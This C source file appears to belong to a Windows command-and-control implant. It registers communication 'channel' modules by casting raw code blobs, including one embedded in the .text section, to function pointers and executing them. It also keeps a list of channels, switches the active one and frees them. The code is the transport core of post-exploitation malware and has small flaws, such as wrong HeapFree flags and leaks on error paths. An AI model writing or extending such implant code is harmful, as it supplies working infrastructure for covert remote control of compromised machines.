#include "Channel.h"
#include "Implant.h"

BYTE		g_DefaultChannelConfig[] = { 0x0 }; // TODO: pass config as argument like BOFs do
LIST_ENTRY	g_ChannelList;
PCHANNEL	g_Channel;

__attribute__((section(".text"))) BYTE g_DefaultChannel[] = DEFAULT_CHANNEL;

// ChannelInitialize
//
BOOL ChannelInitialize() {
	
	InitializeListHead(&g_ChannelList);
	
	if (!ChannelRegister(g_DefaultChannel, sizeof(g_DefaultChannel))) {
		printf("[-] Failed to register channel\n");
		return FALSE;
	}

	if (!ChannelSwitch(0)) {
		printf("[-] Failed to switch to default implant channel\n");
		return FALSE;
	}

	return TRUE;
}

// IChannelRegister register new communication channel
//
BOOL ChannelRegister(PVOID BaseAddr, DWORD Size) {
	PCHANNEL channel = NULL;
	BOOL(*ChannelEntrypoint)(IImplant*, IChannel*);

	channel = (PCHANNEL)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(CHANNEL));
	if (channel == NULL) {
		return FALSE;
	}

	channel->Interface = (IChannel*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(IChannel));
	if (channel->Interface == NULL) {
		return FALSE;
	}

	ChannelEntrypoint = (BOOL(*)(IImplant*, IChannel*))BaseAddr;
	if (!ChannelEntrypoint(&g_Implant, channel->Interface)) {
		return FALSE;
	}
	
	channel->Memory.Base = BaseAddr;
	channel->Memory.Size = Size;

	InsertTailList(&g_ChannelList, &channel->ListEntry);

	return TRUE;
}

BOOL ChannelLoad(PVOID Destination, PVOID Source, DWORD Size) {
	memcpy(Destination, Source, Size);
	return TRUE;
}

BOOL ChannelSwitch(DWORD ID) {
	LIST_ENTRY* current = g_ChannelList.Flink;

	while (current != &g_ChannelList) {
		PCHANNEL Channel = CONTAINING_RECORD(current, CHANNEL, ListEntry);

		if (Channel->Interface->ID == ID) {
			if (!Channel->Interface->Initialize(Channel->Interface->Context)) {
				return FALSE;
			}

			g_Channel = Channel;
			return TRUE;
		}

		current = current->Flink;
	}

	return FALSE;
}

BOOL ChannelRemove(DWORD ID) {
	LIST_ENTRY* current = g_ChannelList.Flink;

	while (current != &g_ChannelList) {
		PCHANNEL Channel = CONTAINING_RECORD(current, CHANNEL, ListEntry);

		if (Channel->Interface->ID == ID) {
			RemoveEntryList(&Channel->ListEntry);
			Channel->Interface->Cleanup(Channel->Interface->Context);
			ChannelFree(Channel);
			return TRUE;
		}

		current = current->Flink;
	}

	return FALSE;
}

VOID ChannelFree(PCHANNEL Channel) {
	VirtualFree(Channel->Memory.Base, Channel->Memory.Size, MEM_RELEASE);
	HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, Channel->Interface);
	HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, Channel);
}